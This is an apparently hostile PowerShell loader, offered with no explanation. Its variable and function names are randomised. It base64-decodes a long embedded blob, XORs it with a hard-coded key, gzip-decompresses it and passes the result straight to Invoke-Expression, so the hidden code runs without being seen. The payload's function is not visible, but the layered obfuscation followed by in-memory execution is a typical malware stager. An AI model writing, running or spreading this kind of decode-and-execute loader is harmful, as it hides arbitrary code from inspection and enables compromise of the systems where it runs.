$9oi6uewa47f3qy5 = [System.Text.Encoding]::ascii
function 8tnu90owh5cyfl3sqdejrp7ibg4  {param($xl0j4ndoyb5zpi9 )
  $h529v6sumqw7ab4 = [System.Convert]::FromBase64String($xl0j4ndoyb5zpi9)
  $y2s5bcvhzdi6fp7= $9oi6uewa47f3qy5.GetBytes("1n0d4ec9yo7u")
    $gtavwlxysr10q4i = $h529v6sumqw7ab4
    $emyzi0qhvadco6f = $(for ($p8o47tqbfv2cruk = 0; $p8o47tqbfv2cruk -lt $gtavwlxysr10q4i.length; ) {
        for ($h0d5fspagy8lbv1 = 0; $h0d5fspagy8lbv1 -lt $y2s5bcvhzdi6fp7.length; $h0d5fspagy8lbv1++) {
            $gtavwlxysr10q4i[$p8o47tqbfv2cruk] -bxor $y2s5bcvhzdi6fp7[$h0d5fspagy8lbv1]
            $p8o47tqbfv2cruk++
            if ($p8o47tqbfv2cruk -ge $gtavwlxysr10q4i.Length) {
                $h0d5fspagy8lbv1 = $y2s5bcvhzdi6fp7.length
            }
        }
    })
	$tqg7ycoes8z6nd4 = New-Object System.IO.MemoryStream( , $emyzi0qhvadco6f )

	    $3js95lt1cfd7n2x = New-Object System.IO.MemoryStream
        $byl5h4j90qkp7x6 = New-Object System.IO.Compression.GzipStream $tqg7ycoes8z6nd4, ([IO.Compression.CompressionMode]::Decompress)
	    $byl5h4j90qkp7x6.CopyTo( $3js95lt1cfd7n2x )
        $byl5h4j90qkp7x6.Close()
		$tqg7ycoes8z6nd4.Close()
		[byte[]] $v5es4a21iclo3ng = $3js95lt1cfd7n2x.ToArray()
 $ehlnpi9bd5u1m8g=$v5es4a21iclo3ng
    return $ehlnpi9bd5u1m8g
}
[byte[]]$g21uvl9c073kas4=8tnu90owh5cyfl3sqdejrp7ibg4 $fkr6e3mhy9ltqoz
[System.Text.Encoding]::ascii.GetString((8tnu90owh5cyfl3sqdejrp7ibg4 "LuU4ZDRlYzl9b7og6hyTXCQYPZOBaKK/aq/b5fbrEJZFtynnSVn+gta/+mQ2BX1zMOSJISa9/bWGEqwu045JbGBkCYw38AmoI8SSptnD8hQgcxaUARn+NhMgi3wsf2t80ErkPsokjB1Ce16NjVISl8pCtzPQm1TSbBSFYMU3vBqRc/pr5yzitKy39g3Vp7loJxe/w5Mhu7Vg+GN75vw6aTOpEgQGcWap/0fUTPggObzyG835AX33qu6qE4JbPLMfYZd4rDOsopusEZRN+0anhEWkgEkxawqZZkB9kELwg5+ft8VR+PjxDhkdtEWX3LgSjW1tZQb7GQewnF8cX6Jx5tBdjSawiI7uxAKuSlSjX3pCOQrlCgK85HL7l/YpdFo8Z8zKwkeF6b0BhNQVrxsbsJLQI5TTlr2jxYREutWaKa4g/NhW44kbRGbmrKPZ4Dq195R+g8kZshVC9U8BZv3bRr94pVxKgr+neZDN/vm+08Ole+qOW7CagnPe0WcrmvSDoj2pltxwN2xPhcyIC+C0QHXFSRacq8Eo88Z676etEvZMywiwHSyqApqTLvr5iH5uRP62qGHa+LZ2acKNgXYvpcxCYZuDUhexELx3FS4st9RY38j7bwiGK8wGiMLf4j1gawBywLurErI/th48I+l4lpnp7GxcMw952zEImWKduDja/rs9eaHH8kpJh2ceoJdei8ka+LIUJUx/ZZV3XwR9CouYAh3bNBt4qeoIYWJ4wrr0cBu0yJqip3ZYJL0Ph0KmHVaBqZeYZiiExSr5WDLZa+B6Q35BexPlcJRd+jerYFndkHT3pYBQRInLRPOOGZkAkNbdMN2kVEhlEo07Gby5dAD5ZFL9xLltzmN3NKwVST1tvo8VMHv1aAo29mAamQjjiY4w6VfIRx7P8/HqKMmG6M0/SFAHLaJniWMwDG/fsZhJiQUi9zzHmWrLVj/m2A2Vgw2YYzmZlQq5ELmz4Mpb/qdeiMqc30gEAHars3+ekfOCmNyd/9xf+yL24l4nNMAC15ZuGImX9UYgIOH4BFoX55G43CD3QMauSMAaLYjBP8FNZ2cxppQoDOmXW7gqFmoiMY2sY4j1HTq1f4EjOI1wsJIyM+GujdeJm1VRT6eZMawI+/J+mxE5vZCf0t2byaWHM7qwFTRgIWYh2+iOP3JctInvW9vtJx+VsRVZbISyb8OQOJa/PDlcKmKLq4qrmwgxP5GdOzNlYw=="))|iex;